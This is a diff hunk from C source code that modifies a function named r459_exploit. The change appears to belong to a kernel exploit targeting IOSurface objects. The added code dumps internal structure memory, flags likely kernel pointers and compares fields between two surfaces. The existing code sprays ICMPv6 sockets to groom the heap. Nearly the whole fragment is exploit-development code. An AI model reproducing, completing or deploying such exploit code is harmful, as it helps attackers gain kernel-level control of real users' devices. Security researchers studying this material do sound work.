@@ -17031,8 +17031,57 @@ static void r459_exploit(void) {
          (unsigned long long)origA8, (unsigned long long)origB8);
     rlog("    Delta: %lld bytes\n", (long long)(origB8 - origA8));
 
-    /* Phase 2: Pre-spray ICMPv6 sockets to fill holes */
-    rlog("\n  --- Phase 2: Pre-spray %d ICMPv6 sockets ---\n", R459_SPRAY_PRE); fflush(stdout);
+    /* Phase 2: Dump internal struct layout */
+    rlog("\n  --- Phase 2: Dump internal struct at +8 ---\n"); fflush(stdout);
+    uint64_t *intA = (uint64_t *)origA8;
+    uint64_t *intB = (uint64_t *)origB8;
+    rlog("    surfA internal struct (first 256 bytes):\n");
+    for (int i = 0; i < 32; i++) {
+        uint64_t va = intA[i];
+        rlog("      [+%3d] 0x%016llx", i * 8, (unsigned long long)va);
+        if (va == sidA) rlog(" <-- surfA ID");
+        if (va == sidB) rlog(" <-- surfB ID");
+        if ((va >> 32) == 0 && va > 0 && va < 0x10000) rlog(" (small)");
+        if ((va & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL) rlog(" *** KPTR ***");
+        rlog("\n");
+    }
+    rlog("\n    surfB internal struct (first 256 bytes):\n");
+    for (int i = 0; i < 32; i++) {
+        uint64_t vb = intB[i];
+        rlog("      [+%3d] 0x%016llx", i * 8, (unsigned long long)vb);
+        if (vb == sidA) rlog(" <-- surfA ID");
+        if (vb == sidB) rlog(" <-- surfB ID");
+        if ((vb >> 32) == 0 && vb > 0 && vb < 0x10000) rlog(" (small)");
+        if ((vb & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL) rlog(" *** KPTR ***");
+        rlog("\n");
+    }
+
+    /* Compare structs to find differing fields (likely per-surface IDs, ports, etc.) */
+    rlog("\n    Fields that differ between surfA and surfB:\n");
+    int diff_count = 0;
+    for (int i = 0; i < 128; i++) {
+        if (intA[i] != intB[i]) {
+            rlog("      [+%3d] A=0x%016llx B=0x%016llx\n", i * 8,
+                 (unsigned long long)intA[i], (unsigned long long)intB[i]);
+            diff_count++;
+            if (diff_count > 20) { rlog("      ... (truncated)\n"); break; }
+        }
+    }
+    rlog("    Total differing qwords in first 1024 bytes: %d\n", diff_count);
+
+    /* Also check: does surfA internal struct contain surfA's base address? */
+    void *baseA = IOSurfaceGetBaseAddress(surfA);
+    void *baseB = IOSurfaceGetBaseAddress(surfB);
+    rlog("\n    surfA base=%p surfB base=%p\n", baseA, baseB);
+    for (int i = 0; i < 128; i++) {
+        if (intA[i] == (uint64_t)(uintptr_t)baseA)
+            rlog("    surfA internal [+%d] contains surfA base address!\n", i * 8);
+        if (intB[i] == (uint64_t)(uintptr_t)baseB)
+            rlog("    surfB internal [+%d] contains surfB base address!\n", i * 8);
+    }
+
+    /* Phase 2b: Pre-spray ICMPv6 sockets to fill holes */
+    rlog("\n  --- Phase 2b: Pre-spray %d ICMPv6 sockets ---\n", R459_SPRAY_PRE); fflush(stdout);
     int pre_fds[R459_SPRAY_PRE];
     int pre_count = 0;
     for (int i = 0; i < R459_SPRAY_PRE; i++) {
